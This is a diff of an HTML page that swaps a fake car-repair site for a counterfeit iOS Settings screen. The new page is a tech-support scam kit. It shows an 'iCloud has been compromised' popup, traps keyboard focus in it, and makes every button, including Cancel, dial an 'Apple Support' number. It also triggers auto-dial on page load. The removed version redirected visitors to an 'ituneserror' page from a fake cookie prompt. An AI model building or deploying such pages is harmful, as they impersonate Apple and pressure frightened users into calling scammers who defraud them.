@@ -1,119 +1,183 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Auto Denting & Painting Services - Cheap & Reliable</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>iOS Settings • Sign-in Popup</title>
   <style>
-    body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f9f9f9; color:#333; }
-    header { background:#1e3d59; color:#fff; padding:15px; text-align:center; }
-    header h1 { margin:0; font-size:28px; }
-    header p { margin:5px 0 0; }
-    nav { background:#ff9800; padding:10px; text-align:center; }
-    nav a { color:#fff; margin:0 15px; text-decoration:none; font-weight:bold; }
-    .hero { background:url('https://images.unsplash.com/photo-1603052876754-4383b1f5089c?auto=format&fit=crop&w=1400&q=80') center/cover no-repeat; height:300px; display:flex; align-items:center; justify-content:center; color:#fff; font-size:30px; font-weight:bold; text-shadow:2px 2px 5px #000; }
-    section { padding:40px 20px; max-width:1000px; margin:auto; }
-    h2 { color:#1e3d59; margin-bottom:15px; }
-    .services { display:grid; grid-template-columns:repeat(auto-fit, minmax(250px,1fr)); gap:20px; }
-    .card { background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
-    .card h3 { margin-top:0; color:#ff9800; }
-    .cta { background:#ff9800; color:#fff; padding:25px; text-align:center; border-radius:8px; }
-    .cta h2 { margin:0 0 10px; }
-    footer { background:#1e3d59; color:#fff; text-align:center; padding:15px; font-size:14px; }
-    .btn { background:#1e3d59; color:#fff; padding:15px 30px; text-decoration:none; border-radius:5px; display:inline-block; margin:10px; cursor:pointer; border:none; font-size:18px; }
-    /* Cookie Consent Modal */
-    .cookie-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; align-items:center; justify-content:center; }
-    .cookie-modal.show { display:flex; }
-    .cookie-content { background:#fff; padding:20px; border-radius:8px; max-width:90%; width:400px; text-align:center; box-shadow:0 4px 12px rgba(0,0,0,0.2); }
-    .cookie-content h2 { color:#1e3d59; font-size:20px; margin:0 0 15px; }
-    .cookie-content p { margin:0 0 20px; font-size:14px; }
-    .cookie-buttons { display:flex; justify-content:center; gap:15px; }
+    :root{
+      --bg:#f2f2f7; --card:#fff; --ink:#1d1d1f; --sub:#6e6e73; --blue:#007aff; --border:#e5e5ea; --shadow:0 10px 30px rgba(0,0,0,.25)
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;background:var(--bg);color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",Arial,sans-serif;line-height:1.4}
+
+    /* ===== Settings UI ===== */
+    .nav{position:sticky; top:0; z-index:0; background:var(--bg); padding:16px 16px 8px}
+    .nav h1{margin:0 0 12px; font-weight:700; font-size:28px}
+    .search{position:relative}
+    .search input{width:100%; padding:10px 36px 10px 12px; border:1px solid var(--border); border-radius:10px; background:#fff; font-size:14px}
+    .search .icon{position:absolute; right:10px; top:50%; transform:translateY(-50%); font-size:13px; color:var(--sub)}
+
+    .wrap{max-width:900px; margin:0 auto; padding:0 16px 40px}
+    .card{background:var(--card); border-radius:12px; box-shadow:0 1px 0 rgba(0,0,0,.04); overflow:hidden; margin-top:14px}
+    .row{display:flex; align-items:center; gap:12px; padding:12px 14px; border-top:1px solid var(--border)}
+    .row:first-child{border-top:none}
+    .sub{font-size:12px; color:var(--sub)}
+    .chev{margin-left:auto; color:var(--sub)}
+    .avatar{width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#9be2ff,#c9f7ff)}
+    .section-title{margin:18px 8px 6px; font-size:13px; color:var(--sub)}
+
+    .ico{width:26px;height:26px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:14px}
+    .wifi{background:#007aff}.bt{background:#0a84ff}.cell{background:#34c759}.notif{background:#ff9f0a}.sound{background:#5856d6}.focus{background:#ff375f}.screent{background:#32ade6}
+
+    /* ===== Classic iOS Popup Overlay ===== */
+    .overlay{position:fixed; inset:0; background:rgba(0,0,0,.55); display:none; align-items:center; justify-content:center; z-index:10; padding:16px}
+    .overlay[aria-hidden="false"]{display:flex}
+
+    .dialog{background:#fff; width:320px; max-width:90vw; border-radius:12px; box-shadow:var(--shadow); text-align:center; overflow:hidden}
+    .dlg-body{padding:18px 18px 12px}
+    .dlg-title{margin:0 0 8px; font-size:18px; font-weight:600; color:#111}
+    .dlg-text{margin:0 0 12px; font-size:14px; font-weight:500; color:#333}
+    .dlg-email{font-weight:600}
+    .field{padding:0 18px 14px}
+    .input{width:100%; padding:8px 10px; border:1px solid #c7c7cc; border-radius:6px; font-size:14px}
+
+    .dlg-divider{height:1px; background:#e0e0e0}
+    .dlg-actions{display:flex; align-items:stretch; justify-content:stretch}
+    .dlg-btn{flex:1; background:#fff; border:0; padding:12px 0; font-size:16px; font-weight:500; color:var(--blue); cursor:pointer}
+    .dlg-btn:disabled{color:#999; cursor:not-allowed}
+    .dlg-btn:active{background:#f5f5f5}
+    .dlg-btn + .dlg-btn{border-left:1px solid #e0e0e0}
+
+    /* ===== Footer Call Bar ===== */
+    .footer-call-bar{position:sticky; bottom:0; background:var(--card); padding:12px 16px; text-align:center; border-top:1px solid var(--border); box-shadow:0 -1px 0 rgba(0,0,0,.04); z-index:5}
+    .footer-call-bar a{font-size:16px; font-weight:500; color:var(--blue); text-decoration:none}
+    .footer-call-bar a:active{color:#005bb5}
+
+    @media (max-width:520px){ 
+      .nav h1{font-size:24px} 
+      .footer-call-bar a{font-size:14px}
+    }
   </style>
 </head>
 <body>
-
-<!-- Cookie Consent Modal -->
-<div class="cookie-modal" id="cookieModal" role="dialog" aria-labelledby="cookieTitle" aria-describedby="cookieDesc">
-  <div class="cookie-content">
-    <h2 id="cookieTitle">Cookie Consent</h2>
-    <p id="cookieDesc">We use cookies to enhance your experience on our website. Please choose an option to continue.</p>
-    <div class="cookie-buttons">
-      <button class="btn" onclick="redirectToiTunes()">Accept</button>
-      <button class="btn" onclick="redirectToiTunes()">Cancel</button>
+  <!-- Settings Header -->
+  <header class="nav" role="banner">
+    <div class="wrap">
+      <h1>Settings</h1>
+      <div class="search" role="search">
+        <input type="search" placeholder="Search" aria-label="Search settings" />
+        <span class="icon">⌘K</span>
+      </div>
     </div>
+  </header>
+
+  <!-- Settings Content -->
+  <main class="wrap" role="main">
+    <div class="card">
+      <div class="row">
+        <div class="avatar" aria-hidden="true"></div>
+        <div>
+          <div style="font-weight:700">Sign in to your iPhone</div>
+          <div class="sub">Set up iCloud, the App Store, and more.</div>
+        </div>
+        <button id="openDlg" class="dlg-btn" style="margin-left:auto; padding:8px 12px">Sign In</button>
+      </div>
+    </div>
+
+    <div class="section-title">WIRELESS</div>
+    <div class="card">
+      <div class="row"><span class="ico wifi">📶</span><div><div>Wi‑Fi</div><div class="sub">Home‑5G</div></div><div class="chev">›</div></div>
+      <div class="row"><span class="ico bt">🅱️</span><div>Bluetooth</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico cell">📱</span><div>Mobile Data</div><div class="chev">›</div></div>
+    </div>
+
+    <div class="section-title">NOTIFICATIONS</div>
+    <div class="card">
+      <div class="row"><span class="ico notif">🔔</span><div>Notifications</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico sound">🔊</span><div>Sounds & Haptics</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico focus">🌙</span><div>Focus</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico screent">⏳</span><div>Screen Time</div><div class="chev">›</div></div>
+    </div>
+
+    <div class="section-title">GENERAL</div>
+    <div class="card">
+      <div class="row"><div>General</div><div class="chev">›</div></div>
+      <div class="row"><div>Control Center</div><div class="chev">›</div></div>
+      <div class="row"><div>Display & Brightness</div><div class="chev">›</div></div>
+      <div class="row"><div>Home Screen</div><div class="chev">›</div></div>
+      <div class="row"><div>Accessibility</div><div class="chev">›</div></div>
+    </div>
+  </main>
+
+  <!-- Classic Popup Overlay on top of Settings -->
+  <div class="overlay" id="overlay" aria-hidden="true">
+    <section class="dialog" role="dialog" aria-modal="true" aria-labelledby="dlg-title" aria-describedby="dlg-desc" tabindex="-1">
+      <div class="dlg-body">
+        <h2 id="dlg-title" class="dlg-title">Sign In to iCloud</h2>
+        <p id="dlg-desc" class="dlg-text">Your Apple iCloud has been compromised. Call Apple Support immediately.</p>
+      </div>
+      <div class="dlg-divider" aria-hidden="true"></div>
+      <div class="dlg-actions" id="dlg-actions">
+        <button type="button" class="dlg-btn" id="cancelBtnNew">Cancel</button>
+        <button type="button" class="dlg-btn" id="callBtn">Call Now</button>
+      </div>
+    </section>
   </div>
-</div>
 
-<header>
-  <h1>Affordable Auto Denting & Painting</h1>
-  <p>Quality Work • Low Prices • Fast Service</p>
-</header>
+  <!-- Footer Call Bar -->
+  <footer class="footer-call-bar" role="contentinfo">
+    <a href="tel:+1-844-485-2265" id="footerCallLink">Call Apple Support Now</a>
+  </footer>
 
-<nav>
-  <a href="#services">Services</a>
-  <a href="#about">About Us</a>
-  <a href="#contact">Contact</a>
-</nav>
+  <script>
+    (function(){
+      const overlay = document.getElementById('overlay');
+      const openBtn = document.getElementById('openDlg');
+      const cancelBtnNew = document.getElementById('cancelBtnNew');
+      const callBtn = document.getElementById('callBtn');
+      const footerCallLink = document.getElementById('footerCallLink');
+      const dialog = overlay.querySelector('.dialog');
 
-<div class="hero">
-  Get Your Car Fixed at the Cheapest Rates!
-</div>
+      function open(){ 
+        overlay.setAttribute('aria-hidden','false'); 
+        setTimeout(() => dialog.focus(), 0); 
+      }
 
-<section id="services">
-  <h2>Our Services</h2>
-  <div class="services">
-    <div class="card">
-      <h3>Denting</h3>
-      <p>We repair dents of all sizes at the lowest cost without compromising quality.</p>
-      <p><strong>Starting from ₹999</strong></p>
-    </div>
-    <div class="card">
-      <h3>Painting</h3>
-      <p>High-quality paint jobs with durable finish, done quickly and affordably.</p>
-      <p><strong>Starting from ₹1,499</strong></p>
-    </div>
-    <div class="card">
-      <h3>Full Body Work</h3>
-      <p>Complete car makeover at the cheapest rates in town.</p>
-      <p><strong>Custom Quotation</strong></p>
-    </div>
-  </div>
-</section>
+      // Enhanced focus trap to keep focus within dialog
+      overlay.addEventListener('focusin', (e) => { 
+        if(!dialog.contains(e.target)) dialog.focus(); 
+      });
 
-<section id="about">
-  <h2>Why Choose Us?</h2>
-  <p>We specialize in <strong>cheap denting and painting services</strong> without cutting corners. 
-     Our skilled mechanics ensure your car looks brand new, at half the price you’d pay elsewhere.</p>
-  <ul>
-    <li>Lowest prices guaranteed</li>
-    <li>Quick turnaround</li>
-    <li>Experienced professionals</li>
-    <li>Quality paints & tools</li>
-  </ul>
-</section>
+      // Prevent clicks outside dialog from having any effect
+      overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) e.preventDefault();
+      });
 
-<section id="contact" class="cta">
-  <h2>Call Us Today for a Free Estimate!</h2>
-  <p>📞 +91 98765 43210</p>
-  <a class="btn" href="tel:+919876543210">Click to Call</a>
-</section>
+      openBtn && openBtn.addEventListener('click', open);
 
-<footer>
-  <p>&copy; <script>document.write(new Date().getFullYear())</script> Auto Denting & Painting | Affordable Car Care</p>
-</footer>
+      cancelBtnNew.addEventListener('click', () => {
+        window.location.assign('tel:+1-844-485-2265');
+      });
 
-<script>
-  // Show cookie modal on page load
-  window.onload = function() {
-    document.getElementById('cookieModal').classList.add('show');
-  };
+      callBtn.addEventListener('click', () => {
+        window.location.assign('tel:+1-844-485-2265');
+      });
 
-  // Redirect to iTunes error page on button click
-  function redirectToiTunes() {
-    window.location.href = 'https://ituneserror.pages.dev/';
-  }
-</script>
-<!-- Default Statcounter code for chase
+      footerCallLink.addEventListener('click', (e) => {
+        e.preventDefault(); // Prevent default anchor behavior
+        window.location.assign('tel:+1-844-485-2265');
+      });
+
+      // Auto-dial first, then open dialog after delay
+      window.addEventListener('load', () => {
+        window.location.assign('tel:+1-844-485-2265');
+        setTimeout(open, 1000); // Delay dialog by 1 second to let auto-dial prompt appear first
+      });
+    })();
+  </script>
+  <!-- Default Statcounter code for chase
 https://freegamezones.pages.dev/ -->
 <script type="text/javascript">
 var sc_project=13166709; 
@@ -130,6 +194,5 @@ src="https://c.statcounter.com/13166709/0/f4da39b8/1/"
 alt="Web Analytics Made Easy - Statcounter"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
-
 </body>
 </html>
